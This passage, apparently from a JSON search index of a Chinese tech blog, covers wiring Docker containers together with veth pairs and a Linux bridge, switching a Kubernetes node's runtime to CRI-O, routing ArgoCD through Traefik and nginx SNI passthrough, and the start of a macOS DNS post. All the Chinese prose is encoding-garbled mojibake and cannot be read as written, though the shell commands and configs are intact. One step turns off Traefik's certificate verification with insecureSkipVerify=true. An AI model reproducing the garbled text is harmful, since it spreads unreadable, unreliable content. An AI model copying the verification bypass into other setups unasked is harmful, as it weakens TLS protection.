/root/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml\n```","tags":["kubernetes"]},{"title":"ä½¿ç”¨ iproute2 å®¢è£½åŒ–ä½ çš„ Container ç¶²è·¯","url":"/2021/04/29/","content":"\n\n## å‰è¨€\n\næˆ‘å€‘éƒ½çŸ¥é“ Docker æœ‰æä¾›ä¸åŒçš„ç¶²è·¯æ¨¡å¼ä¾›æˆ‘å€‘ä½¿ç”¨ï¼Œå¾é è¨­çš„ Bridge åˆ°å…±ç”¨æœ¬æ©Ÿ Network Namespace çš„ Hostã€‚æˆ‘å€‘ç”šè‡³å¯ä»¥è‡ªè¨‚è‡ªå·±çš„ Bridge ä¾†åˆ‡å‰²ä¸åŒç¶²æ®µï¼Œå¦‚æ­¤ä¸€ä¾†ä¸€äº›ç¶²è·¯æ‹“å¢£éƒ½æ¶è¨­éƒ½å¯ä»¥ç”¨ Docker ä¾†å®Œæˆã€‚\n\nå€åˆ¥ä¸åŒç¶²æ®µæˆ‘å€‘é€šå¸¸æœƒä½¿ç”¨ä¸åŒçš„ Bridge ä¾†åˆ†éš”ï¼Œé€šå¸¸æœƒå…ˆå»ºç«‹è‡ªè¨‚çš„ Bridge\n\n`docker network create --driver bridge testing-bridge`\n\nä¹‹å¾Œå»ºç«‹ container æ™‚å¯ä»¥æŒ‡å®šè©² bridge ä¾†ä½¿ç”¨è©²ç¶²è·¯ç©ºé–“\n\n`docker run -it --net=testing-bridge alpine`\n```\n/ # ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n35: eth0@if36: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP\n    link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff\n    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0\n       valid_lft forever preferred_lft forever\n```\n\né€™æ™‚å€™å¯ä»¥ç™¼ç¾ Docker å¹«æˆ‘å»ºç«‹å¥½äº† `172.18.0.2/16` ç¶²æ®µçš„ä»‹é¢å¯ä»¥ä½¿ç”¨ï¼Œé€™æ™‚å€™ä½ æœƒç™¼ç¾è©²ä»‹é¢å¯ä»¥ç›´æ¥å‡ºå¾—å»å¤–ç¶²ï¼Œå› ç‚º Docker å»ºç«‹å¥½ Bridgeï¼Œæ‰€ä»¥å°åŒ…æœƒå¾è©² Bridge åˆ°æœ¬æ©Ÿç«¯å‡ºå»ã€‚\n\né‚£æˆ‘å€‘å¯ä¸å¯ä»¥ä¸è¦è®“ Container æœ‰æ©Ÿæœƒå¾æœ¬æ©Ÿè®“å°åŒ…æµå‡ºå»å‘¢ï¼Ÿ\n\nï¼ˆæœ‰æ™‚å€™è¦å»ºç«‹ç¶²è·¯æ‹“å¢£ï¼Œä¸å¸Œæœ›å°åŒ…èµ°æœ¬æ©Ÿçš„è·¯ç”±å‡ºå»ï¼Œå¸Œæœ›å°åŒ…å¾è©²ç¶²è·¯è·¯ç”±åˆ°å…¶ä»–ç¶²è·¯ï¼Œä¹Ÿå°±æ˜¯å…¶ä»– Containerï¼‰\n\n## è§£æ±ºï¼ˆä½¿ç”¨ veth peerï¼‰\n\nè¦é”æˆé€™ä»¶äº‹ï¼Œæœ€å¿«çš„åšæ³•å°±æ˜¯è‡ªå·±å»ºç«‹ veth ä¸¦ä¸”å°‡ peer å…©ç«¯ç›´æ¥ç¶åœ¨å…©å€‹ Container ä¸Š\n\næˆ‘å€‘æ‰“ç®—ç”¨ iproute2 ç›´æ¥ç®¡ç†ç¶²è·¯ï¼Œæ‰€ä»¥å»ºç«‹ containers æ™‚ä½¿ç”¨ `--net=none`\n\n`docker run -itd --name=left --net=none alpine`\n`docker run -itd --name=right --net=none alpine`\n\næ¥è‘—éœ€è¦è‡ªè¡Œå»ºç«‹ Containers å€‘çš„ Network Namespace\n\n```\nleft_pid=$(docker inspect -f '{{.State.Pid}}' left)`\nright_pid=$(docker inspect -f '{{.State.Pid}}' right)`\nsudo mkdir -p /var/run/netns\nsudo ln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid\nsudo ln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid\n```\n\næ¥è‘—å»ºç«‹ veth peer ä¸¦ä¸”å‘½åç‚º `A` ä»¥åŠ `B`\n\n`ip link add A type veth peer name B`\n\n```\nip link set A netns $left_pid # è¨­å®š peer ç«¯ A åˆ° left container\nip netns exec $left_pid ip link set dev A name eth0 # è¨­å®š namespace ä¸­çš„ä»‹é¢åç¨±\nip netns exec $left_pid ip link set eth0 up # å•Ÿå‹•ä»‹é¢\nip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0 # è¨­å®š IP\n#ip netns exec $left_pid ip route add default via 10.113.1.254\n```\n\næ–°å¢é è¨­è·¯ç”±çš„éƒ¨åˆ†è¨»è§£æ‰æ˜¯å› ç‚ºæˆ‘å€‘å°‡ Containers ç”¨ veth peer æ¥èµ·ä¾†ï¼Œæœ¬ä¾†å°±æ˜¯é€šçš„ï¼Œæ‰€ä»¥ä¸éœ€è¦æœ‰é è¨­è·¯ç”±ä¹Ÿå¯ä»¥åˆ°é”å¦å¤–ä¸€å€‹ Containerã€‚å¯ä»¥ä¾ç…§æƒ…æ³å»è¨­å®šä½ çš„é è¨­è·¯ç”±\n\næ¥è‘—è¨­å®š Container right\n\n```\nip link set B netns $right_pid\nip netns exec $right_pid ip link set dev B name eth0\nip netns exec $right_pid ip link set eth0 up\nip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0\n#ip netns exec $right_pid ip route add default via 10.113.1.254\n```\n\nè¨­å®šå®Œä¹‹å¾Œé€²å» Containers ä½ æœƒç™¼ç¾ä»–çš„ç¶²è·¯ä»‹é¢ç‚º\n\n```\nubuntu@docker-env:~$ docker exec -it left sh\n/ # ip a\n1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n33: eth0@if32: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP qlen 1000\n    link/ether 4e:1b:e1:22:8c:05 brd ff:ff:ff:ff:ff:ff\n    inet 10.113.1.1/24 scope global eth0\n       valid_lft forever preferred_lft forever\n```\n\nä¸¦ä¸”å¯ä»¥ç›´æ¥ ping åˆ°å¦å¤–ä¸€å€‹ Container\n\n```\n/ # ping 10.113.1.2\nPING 10.113.1.2 (10.113.1.2): 56 data bytes\n64 bytes from 10.113.1.2: seq=0 ttl=64 time=0.062 ms\n64 bytes from 10.113.1.2: seq=1 ttl=64 time=0.155 ms\n```\n\nå¦‚æ­¤ä¸€ä¾†å¯ä»¥ç”¨æ­¤æ¦‚å¿µï¼ˆæ­é… Bridgeï¼‰å®Œæˆä¸€äº›è¤‡é›œçš„ç¶²è·¯æƒ…å¢ƒ\n\n## ä½¿ç”¨ Bridge\n\nå¯¦éš›çš„ç¶²è·¯æƒ…æ³ä¸å¤ªå¯èƒ½éƒ½ç”¨ peer å»æ¥ï¼Œå°±é”æˆä¸€å€‹å€ç¶²å…§æœ‰å¤šå° Host é‚„æ˜¯éœ€è¦ä½¿ç”¨ Linux Bridgeã€‚å°±åƒ Docker é è¨­çš„ Bridge æ¨¡å¼èˆ¬ï¼Œé‚£æˆ‘å€‘å¯ä¸å¯ä»¥ä¸è¦é€é Dockerï¼Œè‡ªå·±å»ºç«‹ Bridge ä¾†é”æˆç¶²è·¯éš”é›¢ï¼Œç­”æ¡ˆæ˜¯å¯ä»¥ã€‚è‡ªå·±å»ºç«‹çš„è©±ä½ æœƒç™¼ç¾ Docker é™¤äº†æŠŠ Bridge å»ºç«‹å¥½ä»¥å¤–ï¼Œé‚„æœƒä½¿ç”¨ iptables æŠŠ Container ä¸­çš„æµé‡å¾ Host å¾€å¤–é€ï¼Œæˆ‘å€‘å¦‚æœä¸æƒ³è¦è®“å°åŒ…æœ‰æ©Ÿæœƒå¾ Host æµå‡ºï¼Œè‡ªå·±å»ºç«‹ Bridge æŠŠ veth peer ä¸€ç«¯æ¥ä¸Š Container ä¸€ç«¯æ¥ä¸Š Bridge ä¹Ÿæ˜¯ä¸€å€‹æ–¹æ³•ï¼\n\né¦–å…ˆï¼Œä¸€æ¨£å»ºç«‹å…©å€‹ Containers\n\n```\ndocker run -itd --network=none --name left alpine\ndocker run -itd --network=none --name right alpine\n```\n\næ¥ä¸‹ä¾†æ‰‹å‹•å»ºç«‹ Linux Bridge\n\n```\nbrctl addbr br0\nip link set dev br0 up\n```\n\nå»ºç«‹ veth peer ä¸¦ä¸”å‘½åç‚º left-eth0, left-veth0\nleft-eth0 é€™ç«¯è¦æ”¾å…¥ Container çš„ Network Namespace ä¸­\n\n```\nip link add dev left-eth0 type veth peer name left-veth0\nip link add dev right-eth0 type veth peer name right-veth0\n```\n\næ­¤æ™‚ä½ çš„ Host ä¸Šæœƒæœ‰å››å€‹æ–°å¢çš„ä»‹é¢\n\nå–å¾— Containers çš„ Pid ç”¨ä¾†å°‡ peer åŠ å…¥è©² Pid çš„ Network Namespace\n\n```\nleft_pid=$(docker inspect left -f {{.State.Pid}})\nright_pid=$(docker inspect right -f {{.State.Pid}})\n\nip link set left-eth0 netns ${left_pid} name eth0\nip link set right-eth0 netns ${right_pid} name eth0\n```\n\nåŠ å…¥æˆåŠŸå¾Œï¼Œåœ¨ Host ä¸Šå¯ä»¥çœ‹åˆ°ç¶²å¡å¾å‰›æ‰çš„å››å€‹è®Šæˆå…©å€‹\n\nåœ¨ Container ä¸­ä¹Ÿæœƒçœ‹åˆ°è£¡é¢çš„ä»‹é¢å¤šäº† eth0\n\nå°‡ veth peer å¦ä¸€ç«¯æ¥ä¸Šæˆ‘å€‘è‡ªè¡Œæ–°å¢çš„ Linux Bridgeï¼Œä¸¦ä¸”å°‡ç¶²å¡å•Ÿå‹•\n\n```\nbrctl addif br0 left-veth0\nbrctl addif br0 right-veth0\n\nip link set dev left-veth0 up\nip link set dev right-veth0 up\n```\n\næ¥ä¸‹ä¾†æˆ‘å€‘è¦å¾ Host ä¸Šè¨­å®š Container ä¸­çš„ä»‹é¢ï¼Œå› ç‚ºè©²å·²ç¶“åœ¨ä¸åŒç¶²è·¯ç©ºé–“ï¼Œæ‰€ä»¥æˆ‘å€‘éœ€è¦è‡ªè¡Œ mappingï¼Œä¸ç„¶ iproute2 æœƒæ‰¾ä¸åˆ°è©²ç¶²è·¯ä»‹é¢\n\n```\nln -s /proc/$left_pid/ns/net /var/run/netns/$left_pid\nln -s /proc/$right_pid/ns/net /var/run/netns/$right_pid\nip netns show\n```\n\né‚£ç‚ºä½•ä¸åœ¨ Container ä¸­åšè¨­å®šï¼Ÿå› ç‚ºé€™æ¨£å­éœ€è¦ Container å…·å‚™ç‰¹å®šçš„ Linux Capability\n\n```\nip netns exec $left_pid ip addr add 10.113.1.1/24 dev eth0\nip netns exec $left_pid ip link set eth0 up\nip netns exec $right_pid ip addr add 10.113.1.2/24 dev eth0\nip netns exec $right_pid ip link set eth0 up\n```\n\næ¥ä¸‹ä¾†å°±å¯ä»¥ä½¿ç”¨ ping ä¾†æª¢æŸ¥æ˜¯å¦ Containers ä¹‹é–“ç¶²è·¯æœ‰é€š\n\ndocker exec left ping 10.113.1.2 -c3\ndocker exec right ping 10.113.1.1 -c3\n\nå¦‚æœæ²’é€šçš„è©±ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹ iptables çš„ FORWARD chain æ˜¯ä¸æ˜¯è¢« DROP æ‰äº†ï¼Œæ˜¯çš„è©±å…ˆæŠŠ Policy æ”¹æˆ ACCEPT å³å¯\n\né€šå¸¸æˆ‘å€‘ä½¿ç”¨ Docker å»å»ºç«‹ Bridge çš„è©±ï¼Œé€™äº› iptables è¦å‰‡éƒ½æ˜¯ Docker å¹«æˆ‘å€‘è™•ç†çš„ï¼Œæ‰€ä»¥æˆ‘å€‘ç¾åœ¨éœ€è¦è‡ªè¡Œä¿®æ”¹ iptablesã€‚\n## é¡Œå¤–\n\nDocker æä¾›çš„ç¶²è·¯é¸é …ä¸å¤šï¼Œç•¢ç«Ÿä»–ä¸»è¦æ˜¯ç”¨ä¾†åšè³‡æºéš”é›¢ã€‚é™¤äº†ä»¥ä¸Šå•é¡Œæ²’è¾¦æ³•ç”¨å…§å»ºçš„ç¶²è·¯é¸é …å¤–ï¼Œä¸€å€‹ Container å‡è¨­æœ‰å¤šå€‹ç¶²è·¯ç’°å¢ƒï¼Œä¹Ÿæ²’è¾¦æ³•åœ¨ Container å•Ÿå‹•æ™‚æŒ‡å®šé è¨­è·¯ç”±ï¼Œåªèƒ½ç”¨æ¯”è¼ƒæ‹å½æŠ¹è§’çš„æ–¹å¼åœ¨ entrypoint æˆ–æ˜¯ commands åšã€‚","tags":["docker"]},{"title":"ä¸åœæ©Ÿæ›¿æ› Kubernetes CRI","url":"/2021/04/17/","content":"\n## å•é¡Œ\n\nä»Šå¤©å˜—è©¦å°‡ CRI å¾é è¨­çš„ dockershim æ›¿æ›è‡³ CRI-Oï¼Œç¶²è·¯ä¸Šçš„æ•™å­¸éƒ½æ˜¯æ•™ä½ æ›´æ›å®Œç•¢ä¹‹å¾Œä½¿ç”¨ kubeadm é‡æ–°èµ·ä¸€å€‹ Clusterã€‚ä½†æˆ‘çš„æƒ…å¢ƒéœ€è¦å°ç¾æœ‰çš„ Cluster åšæ›¿æ›ï¼Œæ–¼æ˜¯è‡ªå·±ç ”ç©¶äº†ä¸€ä¸‹å¦‚ä½•ä¸åœæ©Ÿæ›¿æ› CRIã€‚\n\n## æ›¿æ› CRI\n\né¦–å…ˆå°‡ä½ éœ€è¦æ›¿æ›çš„ç¯€é»å…ˆè¨­ drain\n\n`kubectl drain worker-node-1 --ignore-daemonsets`\n\nä¹‹å¾Œé€²å…¥ç¯€é»ï¼Œå°‡åŸæœ¬çš„ CRI dockershim é—œé–‰\n\n`systemctl stop docker`\n\næˆ‘æ‰“ç®—æ›¿æ›æˆ CRI-Oï¼Œæ‰€ä»¥è«‹å…ˆç¢ºå®šä½ æƒ³è¦æ›¿æ›çš„ CRI å·²ç¶“å®‰è£å®Œç•¢ï¼Œä¸¦ä¸”å·²ç¶“å•Ÿå‹•ï¼š\n\n`systemctl status crio`\n\n```\nâ— crio.service - Container Runtime Interface for OCI (CRI-O)\n   Loaded: loaded (/usr/lib/systemd/system/crio.service; enabled; vendor preset: disabled)\n   Active: active (running) since å…­ 2021-04-17 02:25:09 EDT; 15min ago\n     Docs: https://github.com/cri-o/cri-o\n Main PID: 22001 (crio)\n    Tasks: 21\n   Memory: 1.1G\n   CGroup: /system.slice/crio.service\n           â””â”€22001 /usr/bin/crio\n```\n\næ¥è‘—ç…§è‘—ç¶²è·¯ä¸Šçš„æ•™å­¸ï¼Œä¿®æ”¹ `/usr/lib/systemd/system/kubelet.service.d/10-kubeadm.conf`\n\nä¸¦ä¸”å¢åŠ \n\n```\nEnvironment=\"KUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m\"\n```\n\nä½†æ˜¯é‡å•Ÿ kubelet ä¹‹å¾Œæœƒç™¼ç¾æ¯«ç„¡ä½œç”¨ï¼ˆç”¨ `systemctl status kubelet` å¯ä»¥æª¢æŸ¥å•Ÿå‹•åƒæ•¸ï¼‰\n\nç‚ºä½•æœƒæ¯«ç„¡ä½œç”¨ï¼Œæ˜¯å› ç‚ºè©²æª”æ¡ˆæ˜¯ kubeadm å•Ÿå‹•æ™‚è®€å–çš„ï¼Œä½†æ˜¯æˆ‘æ‰“ç®—ä¸åœæ©Ÿæ‰€ä»¥ä¸è€ƒæ…®ä½¿ç”¨ kubeadm é‡å•Ÿï¼Œæˆ‘æ‰“ç®—åœ¨æ¯ä¸€å€‹ç¯€é»ä¸Šé‡å•Ÿ kubelet ä¾†æ›¿æ›ï¼Œæ‰€ä»¥éœ€è¦é‡å° kubelet ä¾†è¨­å®šå•Ÿå‹•åƒæ•¸ã€‚\n\næ–¼æ˜¯æˆ‘åœ¨è©²æª”æ¡ˆæ‰¾åˆ°äº† EnvironmentFile åƒæ•¸ï¼Œä¸¦ä¸”å€¼ç‚º `/etc/sysconfig/kubelet`\n\næ–¼æ˜¯æˆ‘åœ¨ `/etc/sysconfig/kubelet` åŠ å…¥äº†\n\n```\nKUBELET_EXTRA_ARGS=--feature-gates='AllAlpha=false,RunAsGroup=true' --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint='unix:///var/run/crio/crio.sock' --runtime-request-timeout=5m\n```\n\nä¹‹å¾Œé‡å•Ÿ kubelet\n\n`systemctl daemon-reload`\n`systemctl restart kubelet`\n\nå¯ä»¥çœ‹åˆ°å•Ÿå‹•åƒæ•¸å·²ç¶“åƒé€²å»äº†\n\n```\nâ— kubelet.service - kubelet: The Kubernetes Node Agent\n   Loaded: loaded (/usr/lib/systemd/system/kubelet.service; enabled; vendor preset: disabled)\n  Drop-In: /usr/lib/systemd/system/kubelet.service.d\n           â””â”€10-kubeadm.conf\n   Active: active (running) since å…­ 2021-04-17 02:25:09 EDT; 22min ago\n     Docs: https://kubernetes.io/docs/\n Main PID: 22114 (kubelet)\n    Tasks: 16\n   Memory: 51.2M\n   CGroup: /system.slice/kubelet.service\n           â””â”€22114 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --network-plugin=cni --pod-infra-container-image=k8s.gcr.io/pause:3.2 --feature-gates=AllAlpha=false,RunAsGroup=true --container-runtime=remote --cgroup-driver=systemd --container-runtime-endpoint=unix:///var/run/crio/crio.sock --runtime-request-timeout=5m\n```\n\nä½¿ç”¨\n\n`kubectl get node -o wide`\n\nä¹Ÿå¯ä»¥ç™¼ç¾ CRI å·²ç¶“æ›´æ›\n\né‡æ–°è®“è©²ç¯€é»å¯ä»¥è¢«ä½¿ç”¨\n\n`kubectl uncordon worker-node-1`\n\n## æ³¨æ„äº‹é …\n\n1. æ›¿æ› Control Plane ç¯€é»æ™‚è«‹ä¸€å®šè¦æŠŠåŸæœ¬çš„ CRI é—œé–‰ï¼Œå¦å‰‡ç³»çµ±å…ƒä»¶æœƒä½”ç”¨ä½ ç¯€é»ä¸Šçš„ Portï¼Œå°è‡´ä½¿ç”¨æ–°çš„ CRI ç„¡æ³•é †åˆ©å°‡ç³»çµ±å…ƒä»¶è·‘èµ·ä¾†ï¼\n\n2. éƒ¨ç½²å®Œç•¢å¾Œ coredns å ±éŒ¯\n\n```\ncontainer_linux.go:349: starting container process caused \"error adding seccomp rule for syscall socket: requested action matches default action of filter\"               â”‚   Warning  FailedCreatePodSandBox  36m  kubelet, worker-node-2  Failed to create pod sandbox: rpc error: code = Unknown desc = container create failed: time=\"2021-04-17\nâ”‚ T02:23:10-04:00\" level=error msg=\"container_linux.go:349: starting container process caused \\\"error adding seccomp rule for syscall socket: requested action matches def  â”‚ ault action of filter\\\"\"\n```\n\nçœ‹åˆ°é€™ç¯‡ï¼šhttps://github.com/cri-o/cri-o/issues/4491\n\nå°‡ runc å‡ç´šç‚º 1.0.0-rc93 å¾Œè§£æ±º\n\n`yum update runc -y`\n\n3. éƒ¨ç½²å®Œç•¢å¾Œç™¼ç¾ busybox ä¸èƒ½ä½¿ç”¨ pingï¼ˆæ¬Šé™ä¸è¶³ï¼‰ï¼Œå¢åŠ  CRI-O çš„ capabilitiesï¼Œé è¨­åªæœ‰\n\n```\ndefault_capabilities = [\n  \"CHOWN\",\n  \"DAC_OVERRIDE\",\n  \"FSETID\",\n  \"FOWNER\",\n  \"SETGID\",\n  \"SETUID\",\n  \"SETPCAP\",\n  \"NET_BIND_SERVICE\",\n  \"KILL\",\n]\n```\n","tags":["kubernetes"]},{"title":"ä¸€æ¬¡ Traefik èˆ‡ TLS çš„è¸©é›·ç¶“é©—","url":"/2021/03/26/","content":"\n## å•é¡Œé»\n\néƒ¨ç½² ArgoCD é€² Kubernetes å®Œç•¢æ™‚ï¼Œç™¼ç¾ ArgoCD é–‹äº† 80, 443 å…©å€‹ Service Portï¼Œå°æ‡‰åˆ°çš„ Container Port éƒ½åŒæ¨£æ˜¯ 8080ã€‚å¦‚æœä½ ç”¨ http è«‹æ±‚ ArgoCD çš„ Web æ™‚ï¼Œä»–æœƒè«‹ä½ è·³è½‰åˆ° httpsã€‚\n\nç‚ºäº†è®“å¤–éƒ¨çš„ User å¯ä»¥ä½¿ç”¨ ArgoCDï¼Œæˆ‘è¨­å®šäº† Traefik çš„ IngressRoute ä¾†å­˜å–è©²è³‡æºï¼Œä½†æ˜¯å»ä¸€ç›´æ²’æœ‰æˆåŠŸã€‚\n\næˆ‘çš„æ¶æ§‹ç’°å¢ƒç‚º\n\n```\n                    |\nNginx-proxyï¼ˆå¤–éƒ¨ï¼‰  | -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)\n                    |\n```\n\n## Debug\n\n### IngressRoute\n\nç‚ºäº†ç°¡åŒ–ç’°å¢ƒï¼ˆdebugï¼‰ï¼Œæ–¼æ˜¯æˆ‘å¾ Cluster å…§éƒ¨å»æ‰“ Ingressï¼Œç™¼ç¾å›æ‡‰ä¸€ç›´éƒ½æ˜¯ 404ï¼Œä½†æ˜¯æˆ‘æŠŠ Service åš port forward åˆ° local ç«¯ï¼Œå»å¯ä»¥æ­£å¸¸é‹ä½œï¼Œæ‰€ä»¥æ¨æ¸¬æ˜¯ ArgoCD çš„ IngressRoute è¦å‰‡æœ‰èª¤ï¼Œè€Œæˆ‘ä½¿ç”¨çš„è¦å‰‡æ˜¯ArgoCD å®˜æ–¹æ–‡ä»¶æåˆ°çš„ï¼š\n\n```yaml\napiVersion: traefik.containo.us/v1alpha1\nkind: IngressRoute\nmetadata:\n  name: argocd-server\n  namespace: argocd\nspec:\n  entryPoints:\n    - websecure\n  routes:\n    - kind: Rule\n      match: Host(`argocd.example.com`)\n      priority: 10\n      services:\n        - name: argocd-server\n          port: 80\n    - kind: Rule\n      match: Host(`argocd.example.com`) && Headers(`Content-Type`, `application/grpc`)\n      priority: 11\n      services:\n        - name: argocd-server\n          port: 80\n          scheme: h2c\n  tls:\n    certResolver: default\n    options: {}\n```\n\næ–¼æ˜¯æˆ‘ä½¿ç”¨ï¼ˆå¾ Cluster ç¯€é»ä¸Šç›´æ¥æ‰“ Ingressï¼‰\n\n```\ncurl https://argocd.example.com -k\n> href=\"https://argocd.example.com/\">Temporary Redirect</a>.\n\ncurl https://argocd.example.com -k -L\n> curl: (47) Maximum (50) redirects followed\n```\n\næˆ‘æŸ¥äº† Traefik çš„å®˜æ–¹æ–‡ä»¶ç™¼ç¾\n\n```\nThere are 3 ways to configure the backend protocol for communication between Traefik and your pods:\n\n    Setting the scheme explicitly (http/https/h2c)\n    Configuring the name of the kubernetes service port to start with https (https)\n    Setting the kubernetes service port to use port 443 (https)\n\nIf you do not configure the above, Traefik will assume an http connection.\n```\n\nç°¡å–®ä¾†èªªï¼ŒTreafik ä¸¦ä¸æœƒå› ç‚ºä½ ä½¿ç”¨ https å»æ‰“ Ingressï¼Œå°±ä½¿ç”¨è©²å”å®šå¹«ä½ æ‰“å¾Œç«¯çš„ Pod (or Service)ï¼Œå¦‚æœä½ æŒ‡å®š Service ç‚º 443 Port é‚£éº¼ä»–å°±å¹«ä½ ç”¨ https å»è·Ÿå¾Œç«¯çš„ Pod å»ºç«‹é€£ç·šï¼Œè€Œé è¨­éƒ½æ˜¯èµ° http é€£ç·šã€‚\n\næ‰€ä»¥æ‡‰è©²å°‡ yaml æª”æ¡ˆæ”¹ç‚º\n\n```yaml\n    routes:\n        - kind: Rule\n        match: Host(`argocd.example.com`)\n        priority: 10\n        services:\n            - name: argocd-server\n            port: 443\n```\n\næˆ–æ˜¯æŒ‡å®š protocol\n\n```yaml\n    routes:\n        - kind: Rule\n        match: Host(`argocd.tcs-proxy.cscc`)\n        priority: 10\n        services:\n            - name: argocd-server\n            port: 80\n            scheme: https\n```\n\nä¾†å¼·åˆ¶ IngressRoute èˆ‡ ArgoCD ä½¿ç”¨ https å»ºç«‹é€£ç·šã€‚\n\nå¦å¤–ï¼Œå› ç‚º ArgoCD çš„æ†‘è­‰æ˜¯è‡ªè¡Œç°½ç™¼çš„ï¼ŒTraefik ä¸¦èªä¸å¾—è©²å–®ä½ï¼Œæ‰€ä»¥ Traefik å¿…é ˆè¨­å®š `--serversTransport.insecureSkipVerify=true` ä¾†å¿½ç•¥æ†‘è­‰çš„é©—è­‰\n\n### Reverse Proxy to Cluster\n\n```\n                    |\nNginx-proxyï¼ˆå¤–éƒ¨ï¼‰  |  -> K8s-worker(Traefik/Ingress) -> ArgoCD-server(service)\n                    |\n```\n\næˆ‘çš„æƒ…å¢ƒä¸­ï¼ŒCluster å¤–éƒ¨é‚„æœ‰ä¸€å° Load Balancer æœƒå°‡æµé‡å°è‡´ Cluster çš„ Worker Nodesï¼Œä½†æ˜¯ Traefik å·²ç¶“æœ‰æ†‘è­‰äº†ï¼Œå¾Œç«¯çš„ ArgoCD ä¹Ÿæœ‰ï¼Œæˆ‘ä¸¦ä¸æƒ³è¦æœ‰é€™éº¼å¤šçš„æ†‘è­‰æœƒé€ æˆé€£ç·šçš„æ•ˆèƒ½è€—æï¼Œæ–¼æ˜¯æŸ¥åˆ°å¯ä»¥ä½¿ç”¨ tls passthrough çš„æ–¹å¼ä¾†è®“ Nginx ä¸è™•ç†å°åŒ…çš„åŠ å¯†è§£å¯†ï¼Œç›´æ¥å°‡è©²å°åŒ… reverse proxy åˆ°å¾Œç«¯ã€‚\n\nä½†æ˜¯è©²æ–¹å¼æœƒç”¢ç”Ÿä¸€å€‹å•é¡Œï¼ŒNginx å¦‚æœä¸åšè§£å¯†ï¼Œé‚£éº¼ä¹Ÿçœ‹ä¸åˆ°å°åŒ… L7 çš„ Host æ¬„ä½ï¼Œæ–¼æ˜¯åŸæœ¬çš„ virtual host æ–¹å¼å°±ç„¡æ³•æ­£å¸¸è·¯ç”±ï¼Œè§£æ±ºæ–¹å¼ç‚ºä½¿ç”¨ TLS çš„ SNI ä¾†åˆ¤æ–·è·¯ç”±ã€‚\n\n```\nstream {\n    map $ssl_preread_server_name $name {\n        # åœ¨æ­¤è¨­å®šä¸åŒ SNI å°æ‡‰åˆ°ä¸åŒå¾Œç«¯;\n        argocd.tcs-proxy.cscc K8S_WORKER_443;\n        default https_default_backend;\n    }\n\n    upstream K8S_WORKER_443 {\n        server worker-node-1:443;\n        server worker-node-2:443;\n        server worker-node-3:443;\n    }\n\n    server {\n        listen 443;\n        proxy_pass $name; # å¦‚æœæ²’æœ‰è·¯ç”±éœ€æ±‚ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¨­å®š proxy_pass K8S_WORKER_443;\n        ssl_preread on; # è©²é¸é …éœ€è¦æ‰“é–‹ï¼Œæ‰æœ‰è¾¦æ³•è®€å– SNI\n    }\n}\n```\n\nè¦æ³¨æ„çš„æ˜¯ï¼Œé€šå¸¸ Nginx çš„è¨­å®šéƒ½æœƒåœ¨ http directiveï¼Œä½†æ˜¯ tls passthrough å¿…é ˆè¦è¨­å®šåœ¨ stream directive ä¸‹ï¼Œæ„å‘³è‘—åŸæœ¬çš„ log formatter ä¹Ÿç„¡æ³•ä½¿ç”¨äº†ï¼ˆå¯ä»¥å» nginx.conf çœ‹ä¸€ä¸‹ï¼‰ã€‚\n\næ‰€ä»¥æˆ‘å€‘å¿…é ˆå¢åŠ æ–°çš„ log formatter åœ¨ steam directive ä¸‹æ–¹\n\n```\nstream {\n    log_format proxy '$remote_addr - [$time_local] '\n                    '$protocol $status $bytes_sent $bytes_received '\n                    '$session_time \"$upstream_addr\" '\n                    '\"$upstream_bytes_sent\" \"$upstream_bytes_received\" \"$upstream_connect_time\" '\n                    '$remote_addr $remote_port $server_addr $server_port';\n    server {\n        access_log      /var/log/tcp-stream-access.log proxy;\n        #...\n        #...\n    }\n}\n```\n\nå¦‚æ­¤ä¸€ä¾†æœƒç™¼ç¾å¤–å±¤çš„ Nginx æ²’æœ‰ä¸Šæ†‘è­‰ä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨å¢é›†å…§éƒ¨æ†‘è­‰ä¾†å°é€£ç·šé€²è¡ŒåŠ å¯†ï¼","tags":["kubernetes","traefik","nginx"]},{"title":"macOS-ä¸­-VPN-è§£æåŸŸåéŒ¯èª¤","url":"/2021/01/06/","content":"\n# TL;DR\n\nmacOS ä¸­çš„ DNS é †åºä¸¦æ²’æœ‰æ„ç¾©ï¼ˆå„˜ç®¡ç³»çµ±é‚„è®“ä½ ç§»å‹•é †åºï¼‰ï¼Œæ±ºå®š DNS Server ä½¿ç”¨éš¨æ©Ÿæ–¹å¼ä¾†é¸æ“‡ã€‚å¦‚æœæƒ³è¦æŒ‡å®šç‰¹å®šç¶²åŸŸä½¿ç”¨ç‰¹å®šçš„ DNS Serverï¼Œè«‹ä½¿ç”¨ `scutil` æŒ‡ä»¤è¨­å®šã€‚\n\n`/etc/resolv.conf` çš„ nameserver é †åºä¹Ÿç›¸åŒæ²’æœ‰æ„ç¾©ï¼Œç³»çµ±æ¡éš¨æ©Ÿæ–¹å¼é¸æ“‡ nameserverã€‚\n\n# 